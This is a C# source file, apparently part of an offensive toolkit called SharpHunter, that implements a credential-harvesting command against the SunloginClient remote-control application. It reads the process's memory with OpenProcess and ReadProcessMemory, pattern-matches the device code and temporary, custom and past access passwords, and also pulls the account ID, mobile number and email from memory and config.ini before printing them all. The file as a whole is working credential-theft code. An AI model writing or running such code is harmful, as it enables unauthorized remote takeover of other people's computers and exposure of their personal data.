using SharpHunter.Utils;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.IO;

namespace SharpHunter.Commands
{
    public class ExtractedContent
    {
        public long Address { get; set; }
        public string Content { get; set; }
    }

    public class SunLoginDeviceEntry
    {
        public string Version { get; set; }
        public string DeviceCode { get; set; }

        public string PasswordLife { get; set; }
        public string TemporaryPassword { get; set; }
        public string CustomPassword { get; set; }
        public List<string> HistoryPasswords { get; set; } = new List<string>();

        public int PID { get; set; }
        public string ConfigPath { get; set; }
        public string Mobile { get; set; }
        public string Email { get; set; }
        public string AccountID { get; set; }
    }

    public class SunLoginCredCommand : ICommand
    {
        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting credentials from SunloginClient process.");
            GetSunLoginCred();
        }
        public static void GetConfigInfo(string configFilePath, SunLoginDeviceEntry entry)
        {
            if (!File.Exists(configFilePath))
            {
                Logger.WriteLine("[-] config.ini not found.");
                return;
            }
            var configLines = File.ReadAllLines(configFilePath);

            foreach (var line in configLines)
            {
                if (line.StartsWith("host_id_freq="))
                {
                    entry.PasswordLife = line.Split('=')[1].Trim();
                }
                else if (line.StartsWith("account="))
                {
                    entry.AccountID = line.Split('=')[1].Trim();
                }
                else if (line.StartsWith("last_account=") && string.IsNullOrEmpty(entry.AccountID)) // 如果没有获取到 account，则获取 last_account
                {
                    entry.AccountID = line.Split('=')[1].Trim();
                }
                else if (line.StartsWith("full_version="))
                {
                    entry.Version = line.Split('=')[1].Trim();
                }
            }
        }
        const uint PROCESS_VM_READ = 0x0010;
        const uint PROCESS_QUERY_INFORMATION = 0x0400;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_PRIVATE = 0x20000;
        const uint PAGE_READWRITE = 0x04;

        public static void GetSunLoginCred()
        {
            Logger.TaskHeader("Hunting SunLogin", 1);
            string processName = "SunloginClient"; 
            Process[] processes = Process.GetProcessesByName(processName);
            SunLoginDeviceEntry entry = new SunLoginDeviceEntry();
            if (processes.Length == 0)
            {
                Logger.WriteLine($"[-] {processName}.exe is not run.");
                return;
            }

            foreach (var process in processes)
            {
                IntPtr processHandle = NTAPI.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, process.Id);
                if (processHandle == IntPtr.Zero)
                {
                    continue;
                }
                string processDirectory = Path.GetDirectoryName(process.MainModule.FileName);
                string configFilePath = Path.Combine(processDirectory, "config.ini");
                entry.ConfigPath = configFilePath;
                GetConfigInfo(configFilePath, entry);

                byte[] startBytes = Encoding.ASCII.GetBytes("<f f=yahei.28 c=color_edit >");
                byte[] endBytes = Encoding.ASCII.GetBytes("</f>");
                byte[] mobileStartBytes = Encoding.ASCII.GetBytes("<data type=\"field\" name=\"mobile\">");
                byte[] mobileEndBytes = Encoding.ASCII.GetBytes("</data><data type=\"field\" name=\"email\">");
                byte[] emailEndBytes = Encoding.ASCII.GetBytes("</data>");
                List<ExtractedContent> extractedContents = new List<ExtractedContent>();

                try
                {
                    IntPtr address = IntPtr.Zero;
                    while (true)
                    {
                        NTAPI.MEMORY_BASIC_INFORMATION mbi;
                        IntPtr result = NTAPI.VirtualQueryEx(processHandle, address, out mbi, (uint)Marshal.SizeOf(typeof(NTAPI.MEMORY_BASIC_INFORMATION)));

                        if (result == IntPtr.Zero)
                        {
                            break;
                        }

                        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE)
                        {
                            long regionSizeLong = mbi.RegionSize.ToInt64();
                            if (regionSizeLong > int.MaxValue)
                            {
                                Logger.WriteLine("[*] Region size too large, skipping.");
                                address = new IntPtr(mbi.BaseAddress.ToInt64() + regionSizeLong);
                                continue;
                            }

                            byte[] buffer = new byte[regionSizeLong];
                            if (NTAPI.ReadProcessMemory(processHandle, mbi.BaseAddress, buffer, (int)regionSizeLong, out int bytesRead))
                            {
                                int startSequenceIndex = 0;
                                while ((startSequenceIndex = NTAPI.FindBytes(buffer, startBytes, startSequenceIndex)) != -1)
                                {
                                    int endSequenceIndex = NTAPI.FindBytes(buffer, endBytes, startSequenceIndex + startBytes.Length);
                                    if (endSequenceIndex != -1)
                                    {
                                        entry.PID = process.Id; 
                                        long baseAddress = mbi.BaseAddress.ToInt64() + startSequenceIndex;
                                        int length = endSequenceIndex - startSequenceIndex - startBytes.Length;
                                        string content = Encoding.UTF8.GetString(buffer, startSequenceIndex + startBytes.Length, length).Trim();

                                        if (content.Length >= 6 && content.Length <= 13)
                                        {
                                            extractedContents.Add(new ExtractedContent { Address = baseAddress, Content = content });
                                        }
                                        startSequenceIndex = endSequenceIndex + endBytes.Length;
                                    }
                                    else
                                    {
                                        break;
                                    }
                                }

                                int mobileStartIndex = 0;
                                while ((mobileStartIndex = NTAPI.FindBytes(buffer, mobileStartBytes, mobileStartIndex)) != -1)
                                {
                                    int mobileEndIndex = NTAPI.FindBytes(buffer, mobileEndBytes, mobileStartIndex + mobileStartBytes.Length);
                                    if (mobileEndIndex != -1)
                                    {
                                        int emailEndIndex = NTAPI.FindBytes(buffer, emailEndBytes, mobileEndIndex + mobileEndBytes.Length);
                                        if (emailEndIndex != -1)
                                        {
                                            int mobileLength = mobileEndIndex - mobileStartIndex - mobileStartBytes.Length;
                                            entry.Mobile = Encoding.UTF8.GetString(buffer, mobileStartIndex + mobileStartBytes.Length, mobileLength).Trim();

                                            int emailLength = emailEndIndex - mobileEndIndex - mobileEndBytes.Length;
                                            entry.Email = Encoding.UTF8.GetString(buffer, mobileEndIndex + mobileEndBytes.Length, emailLength).Trim();

                                            mobileStartIndex = emailEndIndex + emailEndBytes.Length;
                                        }
                                        else
                                        {
                                            break;
                                        }
                                    }
                                    else
                                    {
                                        break;
                                    }
                                }
                            }
                        }

                        address = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                    }

                    var sortedContents = extractedContents.OrderBy(c => c.Address).ToList();

                    Regex deviceCodeRegex = new Regex(@"^\d{3} \d{3} \d{3}( \d)?$"); // 示例: 126 171 452 或 126 171 452 1
                    Regex tempPwdRegex = new Regex(@"^[a-zA-Z0-9]{6}$"); // 示例: 6756qt, t68348
                    Regex customPwdRegex = new Regex(@"^[a-zA-Z0-9]{6,8}$"); // 示例: Aa12356., 1fmcf5


                    foreach (var content in sortedContents)
                    {
                        if (deviceCodeRegex.IsMatch(content.Content))
                        {
                            entry.DeviceCode = content.Content;
                        }
                        else if (tempPwdRegex.IsMatch(content.Content))
                        {
                            entry.TemporaryPassword = content.Content;
                        }
                        else if (customPwdRegex.IsMatch(content.Content))
                        {
                            entry.CustomPassword = content.Content;
                        }
                    }

                    foreach (var content in sortedContents)
                    {
                        if (content.Content != entry.DeviceCode &&
                            content.Content != entry.TemporaryPassword &&
                            content.Content != entry.CustomPassword &&
                            !entry.HistoryPasswords.Contains(content.Content) && 
                            (tempPwdRegex.IsMatch(content.Content) || customPwdRegex.IsMatch(content.Content)))
                        {
                            entry.HistoryPasswords.Add(content.Content);
                        }
                    }

                    entry.HistoryPasswords.Sort();
                }
                finally
                {
                    NTAPI.CloseHandle(processHandle);
                }
            }
            Logger.WriteLine($"[*] Hunting process: {processName}.exe PID: {entry.PID}");
            Logger.WriteLine($"[*] ConfigFilePath: {entry.ConfigPath}");
            Logger.WriteLine($"[*] SunLogin Version: {entry.Version}");
            Logger.WriteLine($"[*] Hunted OraySunLogin Information: \n");
            if (!string.IsNullOrEmpty(entry.AccountID))
            {
                Logger.WriteLine($"  [+] UserID: {entry.AccountID}");
            }
            else
            {
                Logger.WriteLine($"  [-] User Not Login");
            }
            if (!string.IsNullOrEmpty(entry.Mobile))
            {
                Logger.WriteLine($"  [+] Mobile: {entry.Mobile}");
            }
            if (!string.IsNullOrEmpty(entry.Email))
            {
                Logger.WriteLine($"  [+] Email: {entry.Email}");
            }
            Logger.WriteLine("");
            Logger.WriteLine($"[*] Hunted Remote Control Credentials: \n");
            if (!string.IsNullOrEmpty(entry.DeviceCode))
            {
                Logger.WriteLine($"  [+] DeviceCode: {entry.DeviceCode.Replace(" ", "")}");
            }
            if (!string.IsNullOrEmpty(entry.PasswordLife))
            {
                if (entry.PasswordLife == "2")
                {
                    Logger.WriteLine($"  [*] PasswordLife: Once");
                }
                else if (entry.PasswordLife == "1")
                {
                    Logger.WriteLine($"  [*] PasswordLife: One Day");
                }
                else if (entry.PasswordLife == "0")
                {
                    Logger.WriteLine($"  [*] PasswordLife: Long Time");
                }
            }
            if (!string.IsNullOrEmpty(entry.TemporaryPassword))
            {
                Logger.WriteLine($"  [+] MostlyPass: {entry.TemporaryPassword}");
            }
            if (!string.IsNullOrEmpty(entry.CustomPassword))
            {
                Logger.WriteLine($"  [+] CustomPass: {entry.CustomPassword}");
            }
            if (entry.HistoryPasswords.Count > 0)
            {
                Logger.WriteLine("  [+] HistoryPass: " + string.Join(", ", entry.HistoryPasswords.ToArray()));
            }
        }
    }
}